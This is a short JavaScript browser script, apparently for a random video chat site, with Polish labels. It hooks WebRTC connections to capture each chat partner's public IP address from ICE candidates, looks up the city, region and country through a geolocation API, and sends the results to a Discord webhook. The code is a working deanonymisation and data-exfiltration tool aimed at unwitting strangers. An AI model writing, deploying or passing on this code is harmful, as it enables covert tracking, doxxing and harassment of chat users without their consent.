let apiKey = "your-api-key";

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    const ip = fields[4];
    if (fields[7] === "srflx") {
        postujdodc(ip);
        pocczekajchwile(1500);
        return;
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let postujdodc = async (ip) => {

  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
  let random = Math.floor(Math.random() * 100)

  var request = new XMLHttpRequest();
  request.open("POST", "webhook");
  // again, replace the url in the open method with yours
  request.setRequestHeader('Content-type', 'application/json');

  await fetch(url).then((response) =>
  response.json().then((json) => {
  
  var myEmbed = {
    author: {
      name: `Ome.bot Caller ID: ${random}`
    },
    title: `Adres IP: ${ip}, Miasto: ${json.city}`,
    description: `Kraj: **${json.country_name}**, Wojewodztwo: **${json.state_prov}**`,
    color: hexToDecimal("#3711bf"),
  }
  
  var params = {
    username: `ome.bot`,
    embeds: [ myEmbed ]
  }
  
  request.send(JSON.stringify(params));
  
  // function that converts a color HEX to a valid Discord color
  function hexToDecimal(hex) {
    return parseInt(hex.replace("#",""), 16)
  }
}))
}

function pocczekajchwile(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}
